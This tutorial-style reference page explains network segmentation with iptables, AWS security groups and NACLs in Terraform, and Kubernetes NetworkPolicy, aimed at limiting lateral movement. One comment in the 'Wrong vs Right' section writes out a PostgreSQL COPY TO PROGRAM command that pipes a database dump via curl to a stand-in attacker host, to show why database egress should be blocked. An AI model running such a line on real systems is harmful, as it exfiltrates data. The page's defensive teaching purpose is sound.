---
id: NET-052
title: "Network Segmentation and Firewall Rules"
category: Networking
tier: tier-2-networking-security
folder: NET-networking
difficulty: ★★☆
depends_on: NET-025, NET-045
used_by: NET-053, NET-061
related: NET-025, NET-045, NET-062
tags:
  - networking
  - security
  - firewalls
  - network-segmentation
  - iptables
  - vpc
  - micro-segmentation
status: complete
version: 4
layout: default
parent: "Networking"
grand_parent: "Technical Mastery"
nav_order: 52
permalink: /technical-mastery/net/network-segmentation-and-firewall-rules/
---

**⚡ TL;DR** - Network segmentation divides a network into
isolated zones so that a compromise in one zone cannot
spread to others. Firewall rules implement segmentation
by controlling which traffic crosses zone boundaries.
In cloud environments, VPC security groups and NACLs
provide segmentation. In Kubernetes, NetworkPolicy does
the same. The principle: default-deny + allow only
required flows. A network without segmentation is a
flat network - one compromised host can reach every
other host. Micro-segmentation (zero trust) extends this
to allow list rules between individual services.

| #052 | Category: Networking | Difficulty: ★★★ |
|:---|:---|:---|
| **Depends on:** | Subnets and CIDR Notation (NET-025), VPN Fundamentals (NET-045) | |
| **Used by:** | Networking System Design Interview Patterns, DDoS Attack Types | |
| **Related:** | Subnets and CIDR Notation, VPN Fundamentals, Service Mesh | |

---

### 🔥 The Problem This Solves

A web server is compromised. On a flat network, the
attacker can now reach the database directly, move to
the cache layer, and access internal admin APIs.
Network segmentation means: the web server subnet can
only reach the database on port 5432, nothing else.
The database subnet cannot initiate connections outbound.
The admin API is in a separate management subnet with
bastion-only access. Compromise of one zone limits
the blast radius.

---

### 🧠 Intuition: Defense in Depth via Zones

```
Flat network (dangerous):
  [Internet] → [Load Balancer]
  [Load Balancer] → [ANY internal host]
  [Web Server] → [DB Server] (direct)
  [DB Server] → [Web Server] (reverse - attacker pivot)

Segmented network (correct):
  [Internet] → [DMZ subnet only]
  [DMZ subnet] → [App subnet only, port 8080]
  [App subnet] → [DB subnet only, port 5432]
  [DB subnet] → [NO outbound to app or internet]
  
  Breach in DMZ cannot reach DB directly
  DB cannot call out to internet (data exfiltration blocked)
```

---

### ⚙️ iptables: Linux Firewall Rules

```bash
# iptables processes packets through CHAINS:
# INPUT: packets destined for this host
# OUTPUT: packets originating from this host
# FORWARD: packets being routed through this host

# View current rules:
sudo iptables -L -n -v --line-numbers
# -n: no hostname resolution (faster, shows IPs)
# -v: verbose (shows packet/byte counters)
# --line-numbers: show rule number (needed for deletion)

# Default-deny policy (block everything, then allow explicitly)
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT   # outbound usually allowed

# Allow established connections (return traffic)
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow loopback (required for local services)
sudo iptables -A INPUT -i lo -j ACCEPT

# Allow SSH (admin access) from specific IP only
sudo iptables -A INPUT -p tcp -s 10.0.0.0/8 \
  --dport 22 -j ACCEPT

# Allow HTTP/HTTPS from anywhere
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Allow application port from app subnet only
sudo iptables -A INPUT -p tcp -s 10.0.1.0/24 \
  --dport 8080 -j ACCEPT

# Allow database from app subnet only
sudo iptables -A INPUT -p tcp -s 10.0.1.0/24 \
  --dport 5432 -j ACCEPT

# Log then drop everything else
sudo iptables -A INPUT -j LOG \
  --log-prefix "iptables-drop: " --log-level 4
sudo iptables -A INPUT -j DROP

# Delete a rule by line number:
sudo iptables -D INPUT 5
```

---

### ⚙️ AWS VPC Segmentation

```
AWS network segmentation primitives:

Security Groups (stateful - return traffic automatic):
  - Applied to EC2 instances, RDS, Lambda VPC
  - Default: deny all inbound, allow all outbound
  - Rules can reference other security groups
    (e.g., "allow from web-sg on port 8080")
  - Preferred over CIDR rules where possible
    (security groups auto-track instance IPs)

NACLs - Network Access Control Lists (stateless):
  - Applied to subnets (all traffic in/out of subnet)
  - Stateless: must allow BOTH inbound AND return traffic
  - Numbered rules: lower number = higher priority
  - Default NACL: allow all (must customize)
  - Use for subnet-level blocking (extra defense layer)
```

```hcl
# Terraform: security group for web tier (allow HTTP/S only)
resource "aws_security_group" "web" {
  name        = "web-sg"
  description = "Web tier - HTTP/S from internet"
  vpc_id      = aws_vpc.main.id

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
    description = "HTTPS from internet"
  }

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
    description = "HTTP (redirect to HTTPS)"
  }

  egress {
    from_port       = 8080
    to_port         = 8080
    protocol        = "tcp"
    security_groups = [aws_security_group.app.id]
    description     = "To app tier only"
  }
}

# App tier: only from web security group
resource "aws_security_group" "app" {
  name   = "app-sg"
  vpc_id = aws_vpc.main.id

  ingress {
    from_port       = 8080
    to_port         = 8080
    protocol        = "tcp"
    security_groups = [aws_security_group.web.id]
    description     = "From web tier only"
  }
  # No internet ingress - cannot be reached directly
}

# DB tier: only from app security group
resource "aws_security_group" "db" {
  name   = "db-sg"
  vpc_id = aws_vpc.main.id

  ingress {
    from_port       = 5432
    to_port         = 5432
    protocol        = "tcp"
    security_groups = [aws_security_group.app.id]
    description     = "PostgreSQL from app tier only"
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = []
    # No outbound: database cannot initiate connections
    # This blocks data exfiltration via DB compromise
  }
}
```

---

### ⚙️ Kubernetes NetworkPolicy

```yaml
# Default: allow all traffic between pods (flat network)
# With NetworkPolicy: pods only receive what's explicitly allowed

# Deny all ingress to a namespace (baseline lockdown):
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: production
spec:
  podSelector: {}     # applies to ALL pods in namespace
  policyTypes:
  - Ingress
  # No ingress rules = block all ingress

---

# Allow specific traffic: frontend can call backend
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend       # policy applies to backend pods
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend  # only frontend pods allowed
    ports:
    - protocol: TCP
      port: 8080

---

# Allow backend to reach database (in db namespace):
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-app-to-db
  namespace: database
spec:
  podSelector:
    matchLabels:
      app: postgres
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: production  # only production namespace
    - podSelector:
        matchLabels:
          app: backend
    ports:
    - protocol: TCP
      port: 5432
```

---

### ⚙️ Wrong vs Right: Permissive Outbound Rules

```hcl
# BAD: database with full outbound access
resource "aws_security_group" "db_bad" {
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
    description = "All outbound"
  }
  # Compromise scenario:
  # Attacker gains SQL execution on PostgreSQL
  # COPY TO PROGRAM 'curl attacker.com -d "$(pg_dump prod)"'
  # Full database exfiltrated in minutes
}

# GOOD: database with no outbound (or minimal required only)
resource "aws_security_group" "db_good" {
  # No egress block = AWS default: allow all outbound
  # EXPLICITLY restrict to nothing:
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = []        # no destinations
    self        = false
    description = "Block all outbound"
  }
  # Optionally allow: AWS SSM endpoint (for patch management)
  egress {
    from_port       = 443
    to_port         = 443
    protocol        = "tcp"
    prefix_list_ids = [data.aws_prefix_list.ssm.id]
    description     = "AWS SSM endpoint only"
  }
}
```

---

### ⚙️ Failure Example: Firewall Rule Order Matters

```bash
# iptables evaluates rules IN ORDER - first match wins

# BROKEN: deny added before allow (common mistake)
sudo iptables -A INPUT -j DROP             # rule 1: drop all
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT  # rule 2: never reached

# Check the order:
sudo iptables -L INPUT -n --line-numbers
# 1  DROP  all  --  0.0.0.0/0  0.0.0.0/0
# 2  ACCEPT tcp --  0.0.0.0/0  0.0.0.0/0  tcp dpt:443
# Port 443 is blocked - rule 1 drops everything first

# FIX: insert allow rule BEFORE drop rule
sudo iptables -I INPUT 1 -p tcp --dport 443 -j ACCEPT
# -I = insert (not append), 1 = position 1

# Or: delete rule 1 and re-add in correct order
sudo iptables -D INPUT 1   # delete the DROP rule
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
sudo iptables -A INPUT -j DROP  # default deny at end

# AWS Security Groups: NO ordering concern
# AWS evaluates ALL rules and applies most permissive
# Can't accidentally block with ordering

# AWS NACLs: DO have ordering
# Rule 100 evaluated before rule 200
# First match wins (like iptables)
```

---

### 📐 Scale Considerations

```
Large-scale firewall management challenges:
  100s of microservices × N-to-N rules = rule explosion
  Manual security group management = drift and misconfiguration

Solutions:
  Infrastructure as Code: all SG rules in Terraform/Pulumi
  Security group naming conventions: role-based (web-sg, app-sg)
  Automated compliance: AWS Config rules check SG drift
  Service mesh: Istio mTLS policies replace network-level rules

Kubernetes NetworkPolicy scaling:
  Policy per namespace (not per pod): maintainable
  Policy per pod label: scalable, self-documenting
  Cilium: eBPF-based implementation, L7 policies (HTTP method/path)
    - Policy for "GET /api/v1/*" but not "DELETE /api/*"
    - This is micro-segmentation at the application layer

Zero Trust Network Access (ZTNA):
  Traditional: trust the network segment (VPN = trusted)
  Zero Trust: never trust network location; verify identity
  Implementation:
    - Every service authenticates with mTLS (certificate)
    - Authorization: service identity + resource + action
    - Istio AuthorizationPolicy replaces firewall rules
    - BeyondCorp/Zero Trust: no VPN needed
```

---

### 🧭 Decision Guide

```
Segmentation layer to choose:
  Physical/VLAN: data center, bare metal, legacy
  Security Groups: cloud IaaS (EC2, VMs) - stateful, easy
  NACLs: subnet-level, backup to security groups - stateless
  Network Policy: Kubernetes pods - Label-based
  Service Mesh (Istio): mTLS + L7 policy - most granular

Rule design principles:
  1. Default deny inbound for all tiers
  2. Allow only required ports and sources
  3. Restrict outbound on sensitive tiers (DB, secrets)
  4. Reference security groups/labels, not IPs (dynamic)
  5. Log denied traffic (detect lateral movement)
  6. Review quarterly: rules accumulate and drift

Common architecture patterns:
  3-tier: Internet → Web (public subnet) → App (private)
    → DB (isolated subnet)
  Hub-and-spoke: central security inspection VPC
  Micro-segmentation: service mesh with mTLS per service

Pitfalls:
  Overly permissive: "0.0.0.0/0 on port 0-65535" anywhere
  Missing logging: can't detect or audit traffic
  No egress rules: lateral movement and exfiltration risk
  Manual management: rules drift without IaC
```